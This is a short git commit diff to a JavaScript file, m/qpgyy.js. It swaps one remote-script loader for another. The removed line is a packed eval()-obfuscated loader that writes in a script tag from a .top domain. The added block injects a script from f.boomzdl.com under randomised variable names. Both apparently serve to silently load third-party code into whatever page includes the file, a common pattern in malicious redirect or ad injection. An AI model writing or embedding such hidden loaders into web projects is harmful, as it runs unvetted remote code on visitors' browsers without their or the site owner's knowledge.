145424a78dc7953dab0b0f9679d89b90c2f9f03f
qpgyy <61676079+qpgyy@users.noreply.github.com>
2020-09-01 00:10:41 +0800

    Add files via upload

--- m/qpgyy.js
+++ m/qpgyy.js
@@ -1,1 +1,6 @@
-eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('4.5(\'<0 3="2://1.6.d:7/c/b-a-8.9"><\\/0>\');',14,14,'script|www|https|src|document|writeln|abie23|18443|33|js|4202|x|cc|top'.split('|'),0,{}))
+(function() {
+	var qKgiUFb = document.createElement("script");
+	qKgiUFb.src = "https://f.boomzdl.com/O/1001553O3002203O1O.js";
+	var rWnlS = document.getElementsByTagName("script")[0];
+	rWnlS.parentNode.insertBefore(qKgiUFb, rWnlS);
+})();
